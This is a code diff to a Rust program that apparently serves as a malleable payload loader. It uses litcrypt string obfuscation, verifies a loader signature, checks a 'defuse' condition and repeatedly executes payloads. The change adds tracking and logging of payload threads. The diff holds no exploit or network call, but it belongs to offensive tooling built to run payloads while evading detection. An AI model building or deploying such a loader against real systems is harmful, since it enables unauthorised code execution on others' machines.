@@ -8,6 +8,7 @@ use_litcrypt!();
 
 use malleable_rust_loader::dataoperation::un_apply_all_dataoperations;
 use malleable_rust_loader::dataoperation::DataOperation;
+use malleable_rust_loader::payload::Payload;
 
 use log::debug;
 use log::error;
@@ -56,6 +57,7 @@ fn main() {
     config.verify_newloader_sign(&config).unwrap();
     info!("{}{}", lc!("[+] VERIFIED!"), "\n");
 
+    let mut running_thread: Vec<(thread::JoinHandle<()>, Payload)> = vec![];
     let mut loop_nb = 1;
     loop {
         info!(
@@ -79,9 +81,19 @@ fn main() {
                 error!("{}", lc!("[!] DEFUSE STOP the payload exec"));
             } else {
                 info!("{}", lc!("[+] PAYLOADS exec"));
-                config.exec_payloads();
+                config.exec_payloads(&mut running_thread);
             }
         }
+
+        //print running_thread
+        if running_thread.len() != 0 {
+            info!("[+] RUNNING thread:");
+            for i in &running_thread {
+                info!("thread: {:?}", i);
+            }
+        } else {
+            info!("[+] no RUNNING thread");
+        };
 
         info!(
             "{}{}{}{}",
